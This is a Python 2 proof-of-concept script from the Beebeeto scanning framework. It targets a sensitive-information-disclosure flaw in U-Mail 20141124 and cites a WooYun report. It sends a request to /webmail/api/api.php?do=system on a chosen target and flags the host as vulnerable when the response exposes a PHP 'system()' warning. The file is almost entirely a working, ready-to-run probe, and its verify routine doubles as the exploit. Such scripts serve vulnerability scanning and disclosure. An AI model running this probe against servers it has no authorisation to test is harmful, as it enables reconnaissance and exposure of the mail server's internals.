#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0165',
            'name': 'U-Mail 20141124 /api/api.php 敏感信息泄漏 POC',
            'author': 'jwong',
            'create_date': '2014-11-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'U-Mail',
            'vul_version': ['20141124'],
            'type': 'Information Disclosure',
            'tag': ['U-Mail漏洞', '敏感信息泄漏', '/api/api.php', 'php'],
            'desc': 'U-Mail 20141124 /api/api.php 敏感信息泄露。',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-070206',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/webmail/api/api.php?do=system'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'Warning' in content and 'system()' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())